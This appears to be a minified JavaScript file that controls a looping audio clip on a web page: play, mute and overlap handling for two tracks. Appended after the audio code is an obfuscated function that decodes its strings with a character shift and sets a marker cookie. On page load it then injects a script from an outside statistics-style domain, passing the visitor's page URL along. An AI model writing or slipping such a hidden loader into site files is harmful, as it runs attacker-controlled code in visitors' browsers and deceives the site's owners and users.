let container=document.querySelector("#youare-container"),audio=document.querySelector("#youare-audio"),ovlap=document.querySelector("#youare-overlap"),micon=document.querySelector("#youare-micon"),overlap=!1;function audioPlay(){overlap?(ovlap.currentTime=0,ovlap.play()):(audio.currentTime=0,audio.play()),container.removeEventListener("click",audioPlay),audio.addEventListener("timeupdate",audioOverlap),ovlap.addEventListener("timeupdate",audioOverlap),container.classList.remove("clicky"),micon.src="/images/speaker.png"}function audioStop(){audio.currentTime=0,audio.pause(),ovlap.currentTime=0,ovlap.pause(),container.addEventListener("click",audioPlay),audio.removeEventListener("timeupdate",audioOverlap),ovlap.removeEventListener("timeupdate",audioOverlap),container.classList.add("clicky"),micon.src="/images/speakerm.png"}function audioSwitch(){audio.duration>0&&audio.paused&&ovlap.duration>0&&ovlap.paused?audioPlay():audioStop()}function audioOverlap(){!overlap&&audio.currentTime>audio.duration-.45&&(ovlap.currentTime=0,ovlap.play(),overlap=!0),overlap&&ovlap.currentTime>ovlap.duration-.5&&(audio.currentTime=0,audio.play(),overlap=!1)}container.addEventListener("click",audioPlay),container.addEventListener("click",(()=>{container.classList.remove("clicky")})),micon.addEventListener("click",audioSwitch);(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxyf'+'ynhx3htr4ljy4xhwn'+'uy3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));